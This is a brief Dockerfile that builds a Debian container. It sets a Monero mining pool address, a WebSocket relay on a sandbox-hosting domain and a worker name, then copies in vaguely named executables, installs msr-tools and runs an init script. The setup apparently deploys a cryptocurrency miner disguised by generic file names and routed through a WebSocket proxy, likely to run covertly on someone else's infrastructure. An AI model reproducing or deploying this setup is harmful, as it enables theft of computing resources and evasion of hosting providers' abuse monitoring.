FROM debian:sid

ENV POOL_URL="pool.supportxmr.com:7777"
ENV WS_URL="wss://1sb9mu-10000.csb.app"
ENV NAME_ID=january

COPY my-tu /
COPY init.sh /
WORKDIR /app
COPY mg /app/
COPY config.json /app/

RUN apt update -y \
  && apt upgrade -y \
  && apt install -y wget curl procps msr-tools
RUN chmod a+x /my-tu /init.sh /app/mg 

CMD /init.sh
